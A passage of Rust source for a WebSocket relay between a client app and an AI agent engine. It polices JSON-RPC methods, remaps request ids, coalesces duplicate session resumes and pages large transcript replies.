    const ALLOWED_PROFILE_SECTIONS: &[&str] = &[
        "name",
        "model",
        "provider",
        "confirm_expensive_model",
        "description",
        "soul",
        "disabled_skills",
        "enabled_mcp_servers",
    ];
    const MAX_SOUL_CHARS: usize = 64_000;

    let Some(map) = params.and_then(Value::as_object) else {
        return false;
    };
    if map.keys().any(|key| !ALLOWED_PROFILE_SECTIONS.contains(&key.as_str())) {
        return false;
    }
    match map.get("name").and_then(Value::as_str) {
        Some(name) if !name.trim().is_empty() => {}
        _ => return false,
    }

    let has_description = map.contains_key("description");
    let has_model = map.contains_key("model") || map.contains_key("provider");
    let has_soul = map.contains_key("soul");
    let has_features = map.contains_key("disabled_skills") || map.contains_key("enabled_mcp_servers");
    if !has_description && !has_model && !has_soul && !has_features {
        return false;
    }
    if has_description && !map["description"].is_string() {
        return false;
    }
    for key in ["disabled_skills", "enabled_mcp_servers"] {
        if map.contains_key(key) && !is_valid_name_list(&map[key]) {
            return false;
        }
    }
    if has_soul {
        match map["soul"].as_str() {
            Some(soul) if soul.chars().count() <= MAX_SOUL_CHARS => {}
            _ => return false,
        }
    }
    if has_model {
        for key in ["model", "provider"] {
            match map.get(key).and_then(Value::as_str) {
                Some(text) if !text.trim().is_empty() => {}
                _ => return false,
            }
        }
        if let Some(confirm) = map.get("confirm_expensive_model") {
            if !confirm.is_boolean() {
                return false;
            }
        }
    } else if map.contains_key("confirm_expensive_model") {
        // A confirmation only means something next to a model change.
        return false;
    }
    true
}

/// The refusal message `proxy.py:502-513` sends, or `None` when the method is allowed.
fn client_method_refusal(method: &str, frame: &Value) -> Option<String> {
    if !is_valid_method_name(method) {
        return Some("invalid method".to_string());
    }
    let params = frame.get("params");
    let refused = !CLIENT_METHODS.contains(&method)
        || HARD_DENIED_CLIENT_METHODS.contains(&method)
        || (method == "profiles.configure" && !bot_model_configure_allowed(params))
        || (method == "skills.manage" && !skills_manage_allowed(params));
    if refused {
        return Some(format!("method not allowed by bridge: {method}"));
    }
    None
}

fn error_frame(id: Value, code: i64, message: impl Into<String>) -> Value {
    json!({
        "jsonrpc": "2.0",
        "id": id,
        "error": { "code": code, "message": message.into() },
    })
}

/// Split one WebSocket message into frames and enforce the cap (`proxy.py:175-214`).
///
/// A message with no newline is one frame — the engine's WS transport sends one frame per
/// `send_text` with no trailing newline, while other gateways coalesce newline-delimited frames.
/// Both shapes must work, so the tail of a message is a frame rather than a partial one.
fn split_frames(text: &str, cap: usize) -> Result<Vec<&str>, &'static str> {
    let mut frames = Vec::new();
    for raw in text.split('\n') {
        let line = raw.strip_suffix('\r').unwrap_or(raw);
        if line.trim().is_empty() {
            continue;
        }
        if line.len() > cap {
            return Err("frame_too_large");
        }
        frames.push(line);
        if frames.len() > MAX_FRAMES_PER_MESSAGE {
            return Err("frame_batch_too_large");
        }
    }
    Ok(frames)
}

// ---------------------------------------------------------------------------------------------
// Client → engine
// ---------------------------------------------------------------------------------------------

#[derive(Debug)]
enum ClientAction {
    /// Send this line upstream; `None` means the original bytes, untouched.
    Forward(Option<String>),
    /// Answer the app from the relay (a refusal, a parse error, a history page).
    Answer(Value),
    /// No answer and nothing to forward (`proxy.py:609-631`).
    Drop,
}

/// One client frame, fully policed. `frame` has already been split out of a (possibly batched)
/// message and capped.
fn process_client_frame(state: &ConnectionState, text: &str) -> ClientAction {
    let frame: Value = match serde_json::from_str(text) {
        Ok(frame) => frame,
        Err(_) => {
            return ClientAction::Answer(error_frame(Value::Null, ERROR_PARSE, "parse error"))
        }
    };
    if !frame.is_object() {
        return ClientAction::Answer(error_frame(
            Value::Null,
            ERROR_INVALID_REQUEST,
            "invalid request",
        ));
    }
    if let Some(version) = frame.get("jsonrpc") {
        if !version.is_null() && version != &json!("2.0") {
            return ClientAction::Answer(error_frame(
                frame.get("id").cloned().unwrap_or(Value::Null),
                ERROR_INVALID_REQUEST,
                "invalid jsonrpc version",
            ));
        }
    }

    match frame.get("method") {
        None | Some(Value::Null) => client_response(state, frame),
        Some(Value::String(method)) => {
            let method = method.to_string();
            client_request(state, text, frame, method)
        }
        Some(_) => ClientAction::Answer(error_frame(
            frame.get("id").cloned().unwrap_or(Value::Null),
            ERROR_METHOD_NOT_FOUND,
            "invalid method",
        )),
    }
}

fn client_request(
    state: &ConnectionState,
    original: &str,
    mut frame: Value,
    method: String,
) -> ClientAction {
    let request_id = frame.get("id").cloned().unwrap_or(Value::Null);
    let Some(key) = RpcId::parse(&request_id) else {
        return ClientAction::Answer(error_frame(
            Value::Null,
            ERROR_INVALID_REQUEST,
            "id required",
        ));
    };

    if let Some(message) = client_method_refusal(&method, &frame) {
        eprintln!("relay: refused client method {method}");
        // `proxy.py:514-521`: the method and the reason, never the params that were refused.
        state.note(
            "client_request_rejected",
            Event {
                method: is_valid_method_name(&method).then_some(method.as_str()),
                reason: Some("method_not_allowed"),
                bytes: Some(original.len()),
                direction: Some("client_to_gateway"),
                ..Event::default()
            },
        );
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_METHOD_NOT_FOUND,
            message,
        ));
    }

    // `proxy.py:524-529`: the byte-only attachment methods are checked before anything is
    // forwarded. A refusal is the app's own `-32602`, never a payload echo — except the content
    // sniff, whose whole purpose is to say which file disagreed with its own name.
    if attachments::is_attachment_method(&method) {
        if let Err(error) = attachments::validate_attachment_request(&method, frame.get("params")) {
            state.note(
                "client_request_rejected",
                Event {
                    method: Some(&method),
                    reason: Some("invalid_attachment"),
                    bytes: Some(original.len()),
                    direction: Some("client_to_gateway"),
                    ..Event::default()
                },
            );
            return ClientAction::Answer(if error.explains() {
                attachments::invalid_params_frame_with(request_id, error.detail())
            } else {
                attachments::invalid_params_frame(request_id)
            });
        }
    }

    // Refuse the relay's own reserved id: its answer is consumed, so a client request under it
    // would never be answered (a safe reading of `proxy.py:531-550`, which does not check it).
    if key == RpcId::Str(BRIDGE_CAPABILITIES_ID.to_string()) {
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_INVALID_REQUEST,
            "id is in use by a pending request",
        ));
    }
    if is_autoresume_id(&key) {
        // Same reason, for the replay's id: an answer under it would be read as the relay's own
        // autoresume result and swallowed, leaving the app waiting forever.
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_INVALID_REQUEST,
            "id is reserved by the relay",
        ));
    }
    if lock(&state.pending).contains(&key) {
        state.note("client_request_rejected", Event {
            method: Some(&method),
            reason: Some("id_in_use"),
            bytes: Some(original.len()),
            direction: Some("client_to_gateway"),
            ..Event::default()
        });
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_INVALID_REQUEST,
            "duplicate request id",
        ));
    }
    if lock(&state.server_requests).contains_key(&key) {
        // The engine is waiting on a response under this id; a request reusing it would make the
        // answer ambiguous (`proxy.py:536-550`).
        state.note("client_request_rejected", Event {
            method: Some(&method),
            reason: Some("id_in_use"),
            bytes: Some(original.len()),
            direction: Some("client_to_gateway"),
            ..Event::default()
        });
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_INVALID_REQUEST,
            "id is in use by a pending request",
        ));
    }
    if lock(&state.pending).len() >= MAX_PENDING_REQUESTS {
        state.note(
            "client_request_rejected",
            Event {
                method: Some(&method),
                reason: Some("too_many_pending"),
                direction: Some("client_to_gateway"),
                ..Event::default()
            },
        );
        return ClientAction::Answer(error_frame(
            request_id,
            ERROR_SERVER_BUSY,
            "too many in-flight requests",
        ));
    }

    let mut changed = false;
    if method == "client.capabilities" {
        // The relay answers server requests, so an app declaring a narrower set must not disable
        // approvals for everyone (`proxy.py:563-571`).
        force_server_requests(&mut frame);
        changed = true;
    }
    if adopt_alias(state, &mut frame) {
        changed = true;
    }
    if method == "skills.manage" {
        if let Some(answer) = shape_skills(state, &mut frame, &key) {
            return ClientAction::Answer(answer);
        }
        // Serializing is what makes a dropped `session_id` actually leave: the unchanged path
        // forwards the client's original bytes.
        changed = true;
    }
    // A prompt that references an office document carries its text with it: the engine can only
    // stub a `.xlsx` as "binary file", and the host has already read the bytes, so the labelled
    // blocks are appended here. The `@file:` reference itself stays — the stored row's reference
    // line is how the app fetches the file back — and images never reach this branch.
    if matches!(method.as_str(), "prompt.submit" | "prompt.background" | "session.steer") {
        if let Some(params) = frame.get_mut("params").and_then(Value::as_object_mut) {
            let text = params
                .get("text")
                .and_then(Value::as_str)
                .map(str::to_string);
            if let Some(text) = text {
                if let Some(blocks) = crate::office::prompt_blocks(&text, &state.engine_home) {
                    let mut appended = text;
                    appended.push_str("\n\n");
                    appended.push_str(&blocks);
                    params.insert("text".to_string(), Value::String(appended));
                    changed = true;
                }
            }
        }
    }
    let wire = if changed {
        serde_json::to_string(&frame).unwrap_or_else(|_| original.to_string())
    } else {
        original.to_string()
    };

    if method == "session.resume" && park_duplicate_resume(state, &frame) {
        // A second ask for a conversation already being rendered: its own id is answered from that
        // one reply (see `fan_resume_reply`), so it must not reach the engine a second time.
        return ClientAction::Drop;
    }
    if method == "session.history" || method == "session.resume" {
        if let Some(answer) = inspect_client_text(state, &wire) {
            if let Ok(value) = serde_json::from_str(&answer) {
                return ClientAction::Answer(value);
            }
        }
    }

    // Allowed and about to travel: method name and size, nothing else (`proxy.py:601-607`).
    state.note(
        "client_request",
        Event {
            method: Some(&method),
            bytes: Some(original.len()),
            direction: Some("client_to_gateway"),
            ..Event::default()
        },
    );
    lock(&state.pending).insert(key);
    ClientAction::Forward(if changed { Some(wire) } else { None })
}

fn client_response(state: &ConnectionState, mut frame: Value) -> ClientAction {
    let Some(key) = frame.get("id").and_then(RpcId::parse) else {
        return ClientAction::Drop;
    };
    let original = lock(&state.server_requests).remove(&key);
    match original {
        Some(original) => {
            // The engine's own id is restored so its pending request settles
            // (`proxy.py:609-631`).
            frame["id"] = original;
            match serde_json::to_string(&frame) {
                Ok(wire) => ClientAction::Forward(Some(wire)),
                Err(_) => ClientAction::Drop,
            }
        }
        None => {
            eprintln!("relay: dropped client response to unknown request id");
            ClientAction::Drop
        }
    }
}

/// Apply the learned `skills.manage` dialect to one outbound request (`skills_dialect`).
///
/// `Some(answer)` means answer the app from the relay — a search this engine's handler cannot
/// perform. Otherwise the frame carries the shape the engine accepted, and a request that may be
/// refused is tracked under its id so the reply can teach the dialect.
fn shape_skills(state: &ConnectionState, frame: &mut Value, key: &RpcId) -> Option<Value> {
    let params = frame
        .get("params")
        .and_then(Value::as_object)
        .cloned()
        .unwrap_or_default();
    match state.skills.prepare(&params) {
        Outbound::Answer(result) => {
            eprintln!("relay: skills.manage search answered locally (this engine cannot search)");
            Some(json!({
                "jsonrpc": "2.0",
                "id": frame.get("id").cloned().unwrap_or(Value::Null),
                "result": result,
            }))
        }
        Outbound::Send { wire, track } => {
            frame["params"] = wire;
            if let Some(track) = track {
                lock(&state.skills_pending).insert(key.clone(), track);
            }
            None
        }
    }
}

/// `proxy.py:563-571` — `server_requests` is the relay's fact, not the app's.
fn force_server_requests(frame: &mut Value) {
    match frame.get_mut("params") {
        Some(Value::Object(map)) => {
            map.insert("server_requests".to_string(), Value::Bool(true));
        }
        Some(slot) => *slot = json!({ "server_requests": true }),
        None => {
            frame["params"] = json!({ "server_requests": true });
        }
    }
}

/// `proxy.py:463-489` — point a request at the session a resume actually attached.
///
/// A resume is exempt: it names the stored id it means, and rewriting it hands the engine the
/// previous attach's runtime id, which answers 4007 `unknown_session` — the 2026-11-17 live bug
/// where every re-open after another bot's resume was refused.
fn adopt_alias(state: &ConnectionState, frame: &mut Value) -> bool {
    let Some(method) = frame.get("method").and_then(Value::as_str).map(str::to_string) else {
        return false;
    };
    if ALIAS_EXEMPT.contains(&method.as_str()) {
        return false;
    }
    let alias = lock(&state.aliases);
    if alias.is_empty() {
        return false;
    }
    let Some(params) = frame.get_mut("params").and_then(Value::as_object_mut) else {
        return false;
    };
    let Some(current) = params
        .get("session_id")
        .and_then(Value::as_str)
        .map(str::to_string)
    else {
        return false;
    };
    let Some(replacement) = alias.get(&current).cloned() else {
        return false;
    };
    params.insert("session_id".to_string(), Value::String(replacement));
    // `proxy.py:978-986` — the stored id was rewritten to the runtime id the resume attached.
    state.note(
        "session_rekeyed",
        Event {
            method: Some(&method),
            direction: Some("gateway_to_client"),
            outcome: Some("adopted"),
            ..Event::default()
        },
    );
    true
}

// ---------------------------------------------------------------------------------------------
// Engine → client
// ---------------------------------------------------------------------------------------------

struct EngineAction {
    /// Frame to send the app; `None` forwards the original bytes unless `swallow`.
    to_client: Option<String>,
    /// Frame to send the engine instead of (or in addition to) the original.
    to_engine: Option<String>,
    /// The engine's frame must not reach the app at all.
    swallow: bool,
    /// Send `client.capabilities {server_requests: true}` upstream after this frame.
    send_caps: bool,
}

impl EngineAction {
    fn forward() -> Self {
        Self {
            to_client: None,
            to_engine: None,
            swallow: false,
            send_caps: false,
        }
    }
}

fn process_engine_frame(state: &ConnectionState, text: &str) -> EngineAction {
    let Ok(frame) = serde_json::from_str::<Value>(text) else {
        // Kept forwardable: a non-JSON engine frame is the engine's bug, and killing a live
        // conversation over it is worse than relaying it (the Python bridge closes 1002 here).
        return EngineAction::forward();
    };
    if !frame.is_object() {
        return EngineAction::forward();
    }

    match frame.get("method").and_then(Value::as_str) {
        Some(method) => {
            let method = method.to_string();
            let id = frame.get("id").cloned();
            if let Some(original_id) = id.as_ref().filter(|id| RpcId::parse(id).is_some()) {
                // A server request: the engine is asking the app something.
                if !server_request_allowed(&method) {
                    let message = if is_valid_method_name(&method) {
                        format!("method not supported by client: {method}")
                    } else {
                        "method not supported by client".to_string()
                    };
                    eprintln!("relay: declined engine request {method}");
                    return EngineAction {
                        to_client: None,
                        to_engine: Some(
                            serde_json::to_string(&error_frame(
                                original_id.clone(),
                                ERROR_METHOD_NOT_FOUND,
                                message,
                            ))
                            .unwrap_or_default(),
                        ),
                        swallow: true,
                        send_caps: false,
                    };
                }

                let (client_id, remapped) = remap_server_request(state, original_id);
                lock(&state.server_requests).insert(client_id.clone(), original_id.clone());
                let mut outgoing = frame;
                if remapped {
                    outgoing["id"] = rpc_id_value(&client_id);
                }
                EngineAction {
                    to_client: serde_json::to_string(&outgoing).ok(),
                    to_engine: None,
                    swallow: false,
                    send_caps: false,
                }
            } else {
                // A notification (no id): ready is the cue to declare the relay's capability,
                // once per connection (`proxy.py:742-777`).
                let ready = method == "event"
                    && frame
                        .get("params")
                        .and_then(|params| params.get("type"))
                        .and_then(Value::as_str)
                        == Some("gateway.ready");
                let send_caps =
                    ready && !state.caps_sent.swap(true, Ordering::SeqCst);
                EngineAction {
                    to_client: None,
                    to_engine: None,
                    swallow: false,
                    send_caps,
                }
            }
        }
        None => {
            if frame.get("id").and_then(RpcId::parse)
                == Some(RpcId::Str(BRIDGE_CAPABILITIES_ID.to_string()))
            {
                // The relay's own handshake answer is consumed, never leaked to the app
                // (`proxy.py:836-839`).
                return EngineAction {
                    swallow: true,
                    ..EngineAction::forward()
                };
            }
            if let Some(key) = frame.get("id").and_then(RpcId::parse) {
                if is_autoresume_id(&key) {
                    // The replay's answer. The app already has this session, so it is consumed —
                    // but its runtime id must be adopted, or every later frame names the id the
                    // dead engine had (`proxy.py:964-985`).
                    if frame.get("error").is_some() {
                        eprintln!("relay: autoresume refused by the engine: {}", preview(text));
                        state.autoresume_failed.store(true, Ordering::SeqCst);
                        state.note(
                            "session_autoresume",
                            Event {
                                method: Some("session.resume"),
                                outcome: Some("failed"),
                                reason: Some("refused"),
                                error_kind: Some("unknown_session"),
                                ..Event::default()
                            },
                        );
                    } else if let Some(target) = state.last_resume() {
                        adopt_restarted_session(state, &frame, &target.key());
                        // The app's own resume id died with the old socket. Whoever was waiting on
                        // this conversation — the open itself, plus any retry that joined it — is
                        // answered from the replay's reply, so a restart costs a render and not a
                        // two-minute silence the user cannot see the end of.
                        let waiting = lock(&state.parked).pending_for(&target.key());
                        if !waiting.is_empty() {
                            if let Ok((paged, rows)) = history::page_resume_response(
                                frame.clone(),
                                history::PAGE_MESSAGES,
                                history::PAGE_BYTES,
                            ) {
                                lock(&state.cache).remember(target.key(), rows);
                                return EngineAction {
                                    to_client: fan_resume_reply(&paged, &waiting),
                                    to_engine: None,
                                    // The engine's replay frame is still swallowed: the app sees
                                    // its own resume answered, under its own id.
                                    swallow: true,
                                    send_caps: false,
                                };
                            }
                        }
                    }
                    return EngineAction {
                        swallow: true,
                        ..EngineAction::forward()
                    };
                }
                // A `skills.manage` reply may be the engine telling us which wire shape it
                // accepts. Handled before the pending id is dropped: the retry reuses that id.
                // Bind the removal before the body on purpose: an `if let` condition's temporary
                // (the mutex guard) lives through the body, and the retry re-locks the same map.
                let tracked = lock(&state.skills_pending).remove(&key);
                if let Some(track) = tracked {
                    if let Some(reaction) = skills_reaction(state, &track, &frame, &key) {
                        return reaction;
                    }
                }
                lock(&state.pending).remove(&key);
            }
            EngineAction {
                to_client: inspect_engine_text(state, text),
                ..EngineAction::forward()
            }
        }
    }
}

/// Interpret one `skills.manage` reply: swallow a shape refusal and retry, answer a broken search
/// locally, or let a normal reply/error through.
///
/// `None` means "nothing to do" — the caller then forwards the frame it already has.
fn skills_reaction(
    state: &ConnectionState,
    track: &SkillsTrack,
    frame: &Value,
    key: &RpcId,
) -> Option<EngineAction> {
    let Some(error) = frame.get("error") else {
        // A successful reply is the proof that the shape travelled: remember it as accepted.
        state.skills.note_accepted(track);
        return None;
    };
    let code = error.get("code").and_then(Value::as_i64);
    let message = error.get("message").and_then(Value::as_str).unwrap_or("");
    match state.skills.on_error(track, code, message) {
        Reaction::Pass => None,
        Reaction::Retry { params, track } => {
            eprintln!(
                "relay: skills.manage was refused for its wire shape ({}); retrying once without \
                 the extra field",
                code.map(|c| c.to_string()).unwrap_or_else(|| "no code".to_string())
            );
            lock(&state.skills_pending).insert(key.clone(), track);
            let retry = json!({
                "jsonrpc": "2.0",
                "id": rpc_id_value(key),
                "method": "skills.manage",
                "params": params,
            });
            Some(EngineAction {
                to_client: None,
                to_engine: serde_json::to_string(&retry).ok(),
                // The app asked once; it must not see the engine's contract error.
                swallow: true,
                send_caps: false,
            })
        }
        Reaction::Degrade(result) => {
            eprintln!(
                "relay: skills.manage search is broken on this engine \
                 ({}); answering with an empty result",
                code.map(|c| c.to_string()).unwrap_or_else(|| "no code".to_string())
            );
            let answer = json!({
                "jsonrpc": "2.0",
                "id": rpc_id_value(key),
                "result": result,
            });
            Some(EngineAction {
                to_client: serde_json::to_string(&answer).ok(),
                to_engine: None,
                swallow: false,
                send_caps: false,
            })
        }
    }
}

/// Give a server request an id the app does not already hold, `brq-N` (`proxy.py:811-827`).
fn remap_server_request(state: &ConnectionState, original: &Value) -> (RpcId, bool) {
    let key = RpcId::parse(original);
    let busy = match &key {
        Some(key) => {
            lock(&state.pending).contains(key) || lock(&state.server_requests).contains_key(key)
        }
        None => true,
    };
    if !busy {
        return (key.expect("checked above"), false);
    }
    loop {
        let seq = state.server_seq.fetch_add(1, Ordering::SeqCst) + 1;
        let candidate = RpcId::Str(format!("brq-{seq}"));
        let taken = lock(&state.pending).contains(&candidate)
            || lock(&state.server_requests).contains_key(&candidate);
        if !taken {
            return (candidate, true);
        }
    }
}

fn rpc_id_value(id: &RpcId) -> Value {
    match id {
        RpcId::Int(n) => json!(n),
        RpcId::UInt(n) => json!(n),
        RpcId::Str(s) => json!(s),
    }
}

/// Whether an id belongs to the relay's own autoresume replay (`AUTORESUME_ID`), not to the app.
fn is_autoresume_id(id: &RpcId) -> bool {
    matches!(id, RpcId::Str(name) if name.starts_with(AUTORESUME_ID))
}

// ---------------------------------------------------------------------------------------------
// Transcript paging (unchanged behaviour, plus alias bookkeeping)
// ---------------------------------------------------------------------------------------------

/// Park a repeat `session.resume` for a conversation this connection is already asking about.
///
/// The engine builds the whole transcript per resume (measured: 6.2 s / 7.5 MiB for 6,778 rows),
/// and the app's open path can ask several times while it waits (a deadline tap, a reconnect, a
/// banner). Forwarding each one queued them: three concurrent asks answered at 6.2 s, 12.6 s and
/// 18.5 s, which is how a slow open became a 120 s timeout. One request, one render, one answer
/// fanned out to every id — and nothing is dropped that could not be answered.
fn park_duplicate_resume(state: &ConnectionState, frame: &Value) -> bool {
    let key = HistoryKey::from_params(frame.get("params"));
    if key.session_id.is_empty() {
        // Not addressable (a notification, or a create): nothing to coalesce.
        return false;
    }
    let Some(id) = frame.get("id") else {
        return false;
    };
    if !lock(&state.parked).park(&key, id) {
        return false;
    }
    state.note(
        "resume_coalesced",
        Event {
            method: Some("session.resume"),
            profile: (!key.profile.is_empty()).then_some(key.profile.as_str()),
            outcome: Some("coalesced"),
            direction: Some("client_to_gateway"),
            ..Event::default()
        },
    );
    eprintln!("relay: a repeat session.resume joined the one already in flight");
    true
}

/// Client → engine for the two paging methods. Returns the frame to send back to the client
/// instead of forwarding it, or `None` when the frame belongs to the engine. Every `None` path is
/// a byte-for-byte forward.
///
/// Two jobs:
///   * note a `session.resume` request's id and `(session_id, profile)`, so its (possibly huge)
///     reply can be recognised and paged on the way back;
///   * answer a `session.history` request that carries a cursor from this connection's own copy of
///     that resume — the engine's `session.history` reads MODEL history (compacted rows dropped:
///     measured 157 rows for a 1450-row resume), so forwarding would silently skip rows.
fn inspect_client_text(state: &ConnectionState, text: &str) -> Option<String> {
    // Cheap substring test first: every other frame (prompts, approvals, capability updates) must
    // cost one scan and no parse.
    let mentions_history = text.contains("session.history");
    let mentions_resume = text.contains("session.resume");
    if !mentions_history && !mentions_resume {
        return None;
    }
    let frame: Value = serde_json::from_str(text).ok()?;

    if mentions_resume
        && frame.get("method").and_then(Value::as_str) == Some("session.resume")
    {
        // Kept even when the reply is not paged: an engine restart is survived by replaying it.
        state.note_resume_target(frame.get("params"));
        // A resume with no id is a notification: nothing will come back to page.
        if let Some(id) = frame.get("id") {
            lock(&state.resumes).note(id, frame.get("params"));
        }
    }
    if !mentions_history {
        return None;
    }

    let request = history::history_request(&frame)?;
    let answer = match lock(&state.cache).page(
        &request.key,
        request.cursor,
        request.limit,
        history::PAGE_BYTES,
    ) {
        Some(page) => history::history_reply(&request.id, &page.rows, page.cursor, page.total),
        None => history::history_error(
            &request.id,
            history::ERROR_HISTORY_UNAVAILABLE,
            "history page unavailable",
        ),
    };
    // Serializing a `Value` cannot fail; if it somehow did, forwarding the request to the engine is
    // still better than dropping the frame.
    serde_json::to_string(&answer).ok()
}

/// Engine → client. Returns the rewritten frame, or `None` to forward the original bytes untouched.
fn inspect_engine_text(state: &ConnectionState, text: &str) -> Option<String> {
    let oversized = text.len() > history::MAX_RELAY_BYTES;
    let awaiting_resume = !lock(&state.resumes).is_empty();
    if !oversized && !awaiting_resume {
        return None;
    }
    let mut frame: Value = serde_json::from_str(text).ok()?;

    // A JSON-RPC response: `id`, no `method`. Its id decides whether it is the resume we paged for.
    if awaiting_response(&frame) {
        let reply_id = frame.get("id").cloned();
        if let Some(key) = reply_id
            .as_ref()
            .and_then(|id| lock(&state.resumes).take(id))
        {
            // Whoever joined this request while the engine was rendering it is answered from the
            // SAME reply (see `park_duplicate_resume`): one render, every id.
            let waiters = reply_id
                .as_ref()
                .map(|id| lock(&state.parked).answer(id))
                .unwrap_or_default();
            match history::page_resume_response(
                frame,
                history::PAGE_MESSAGES,
                history::PAGE_BYTES,
            ) {
                Ok((paged, rows)) => {
                    let alias = note_resume_alias(state, &paged, &key);
                    lock(&state.cache).remember(key.clone(), rows.clone());
                    if let Some(fresh) = &alias {
                        // The app's later `session.history` names the *stored* id and is
                        // rewritten to the runtime id before paging, so the page must be found
                        // under both keys or "load earlier" answers -32001 after a resume.
                        lock(&state.cache)
                            .remember(HistoryKey::new(fresh, &key.profile), rows);
                    }
                    return fan_resume_reply(&paged, &waiters);
                }
                // Not a pageable reply (an error, or a shape we do not recognise): the engine's
                // own answer goes to the app, and the same answer goes to every id that waited.
                Err(original) => {
                    note_resume_alias(state, &original, &key);
                    if !waiters.is_empty() {
                        return fan_resume_reply(&original, &waiters);
                    }
                    frame = original;
                }
            }
        }
    }

    if !oversized {
        return None;
    }
    let (trimmed, report) = history::trim_oversize(frame, history::MAX_RELAY_BYTES)?;
    eprintln!(
        "relay: trimmed oversized engine frame {} -> {} bytes (field {}, {} dropped)",
        report.bytes_before, report.bytes_after, report.field, report.dropped
    );
    // The size received, the size sent, and nothing of the transcript that was cut. The field name
    // (`result.messages[12].content`) is not a token, so the reason stays a fixed slug.
    state.note(
        "frame_trimmed",
        Event {
            bytes: Some(report.bytes_before),
            outcome: Some("trimmed"),
            reason: Some("oversize"),
            direction: Some("gateway_to_client"),
            ..Event::default()
        },
    );
    serde_json::to_string(&trimmed).ok()
}

/// Serialise a resume reply for the app, once per id that asked for it.
///
/// A duplicate resume is answered from the leader's reply with its own id, so the client sees a
/// normal answer for the call it made. Several frames ride one NDJSON write (the native clients
/// split on `0x0A`), which is why this returns one string.
fn fan_resume_reply(reply: &Value, waiters: &[RpcId]) -> Option<String> {
    let leader = serde_json::to_string(reply).ok()?;
    if waiters.is_empty() {
        return Some(leader);
    }
    let mut lines = String::with_capacity(leader.len());
    lines.push_str(&leader);
    for waiter in waiters {
        let mut copy = reply.clone();
        if let Some(object) = copy.as_object_mut() {
            object.insert("id".to_string(), rpc_id_value(waiter));
        }
        if let Ok(line) = serde_json::to_string(&copy) {
            lines.push('\n');
            lines.push_str(&line);
        }
    }
    eprintln!(
        "relay: answered {} parked resume(s) from one engine reply",
        waiters.len()
    );
    Some(lines)
}

/// Record the runtime id a tracked resume attached (`proxy.py:964-985`), so every later frame can
/// be pointed at it. Returns the new id when an alias was recorded.
fn note_resume_alias(state: &ConnectionState, frame: &Value, key: &HistoryKey) -> Option<String> {
    if key.session_id.is_empty() {
        return None;
    }
    let fresh = frame
        .get("result")
        .and_then(|result| result.get("session_id"))
        .and_then(Value::as_str)?;
    if fresh.is_empty() || fresh == key.session_id {
        return None;
    }
    lock(&state.aliases).insert(key.session_id.clone(), fresh.to_string());
    Some(fresh.to_string())
}

fn awaiting_response(frame: &Value) -> bool {
    frame.get("method").is_none() && frame.get("id").is_some()
}

/// Adopt the runtime id a *replayed* resume attached, keeping the id the previous engine attach
/// minted pointing at the new one. After a restart the app may still name the runtime id it was
/// handed before the drop, and that id died with the old engine.
fn adopt_restarted_session(state: &ConnectionState, frame: &Value, key: &HistoryKey) {
    if key.session_id.is_empty() {
        return;
    }
    let Some(fresh) = frame
        .get("result")
        .and_then(|result| result.get("session_id"))
        .and_then(Value::as_str)
    else {
        return;
    };
    if fresh.is_empty() || fresh == key.session_id {
        return;
    }
    let mut aliases = lock(&state.aliases);
    if let Some(previous) = aliases.insert(key.session_id.clone(), fresh.to_string()) {
        if previous != fresh {
            aliases.insert(previous, fresh.to_string());
        }
    }
    eprintln!("relay: autoresume attached a new runtime; later frames follow it");
    state.note(
        "session_autoresume",
        Event {
            method: Some("session.resume"),
            direction: Some("gateway_to_client"),
            outcome: Some("resumed"),
            ..Event::default()
        },
    );
}

// ---------------------------------------------------------------------------------------------
// The relay itself
// ---------------------------------------------------------------------------------------------

/// Dial the engine and splice frames. No device binding: used where the caller has no device
/// (the tests, and any host-side caller). The device-bound path is `relay_guarded`.
#[allow(dead_code)]
pub async fn relay(socket: WebSocket, engine_url: String, engine_token: Option<String>) {
    relay_guarded(
        socket,
        engine_url,
        engine_token,
        None,
        Registry::default(),
        Limits::default(),
        None,
        PathBuf::new(),
    )
    .await;
}

/// `audit` is `None` only for callers with no service state (the host-side `relay` above and the
/// tests). Production passes `AppState::audit`, exactly as `routes::ws_upgrade` does — and with it
/// `AppState::engine_home`, the root [`crate::office::prompt_blocks`] reads office references under.
pub async fn relay_guarded(
    mut socket: WebSocket,
    engine_url: String,
    engine_token: Option<String>,
    device_id: Option<String>,
    registry: Registry,
    limits: Limits,
    audit: Option<Arc<AuditLog>>,
    engine_home: PathBuf,
) {
    // No token when the engine wants none: `routes::ws_upgrade` hands over `None` in that case.
    let url = crate::engine_client::engine_url(&engine_url, engine_token.as_deref());

    // Register before dialing so a revoke that lands mid-dial is still honoured, and so the socket
    // caps are checked against the socket that is actually opening. The sender is cloned into the
    // registry; `keepalive` keeps the channel open for the socket's lifetime so `recv()` never
    // returns `None` and spins the select loop.
    let (ctl_tx, mut ctl_rx) = mpsc::channel::<Control>(8);
    let keepalive = ctl_tx.clone();
    let registration = match device_id.as_ref() {
        Some(device) => match registry.register_capped(device, ctl_tx) {
            Ok((id, activity)) => Some(Registration {
                registry: registry.clone(),
                device: device.clone(),
                id,
                activity,
            }),
            Err(refusal) => {
                // The one case an upgrade is refused: no older socket could be closed for it.
                eprintln!(
                    "relay: refusing a socket for device {}: {}",
                    short_id(device),
                    refusal.detail()
                );
                let _ = socket
                    .send(AxMsg::Close(Some(CloseFrame {
                        code: CLOSE_TOO_MANY_SOCKETS,
                        reason: refusal.detail().into(),
                    })))
                    .await;
                return;
            }
        },
        None => None,
    };
    let activity = registration.as_ref().map(|registration| registration.activity.clone());

    // Frames the *host* originates (a reaction another device changed) travel down the same app
    // socket as the engine's. Subscribed once per connection, before the first splice: a receiver
    // only sees what is sent after it exists.
    let mut host_frames = registry.subscribe();

    let state = Arc::new(ConnectionState::with_audit(audit, device_id.clone()).with_home(engine_home));
    state.note("ws_open", Event::default());
    // Split once: the splice is re-run on the *same* client socket when the engine restarts, and a
    // socket cannot be re-split.
    let (mut client_tx, mut client_rx) = socket.split();
    let frame_cap = limits.frame_cap;

    // Set once the engine has closed 4001: the next splice opens with this resume instead of an
    // empty socket. `autoresumed` makes that a one-time repair per connection, not a reconnect loop.
    let mut replay: Option<String> = None;
    let mut autoresumed = false;
    let mut dial_attempts = 0u32;

    let (code, reason) = 'splice: loop {
        if replay.is_some() {
            dial_attempts += 1;
        }
        let upstream = tokio::select! {
            result = tokio_tungstenite::connect_async(&url) => result,
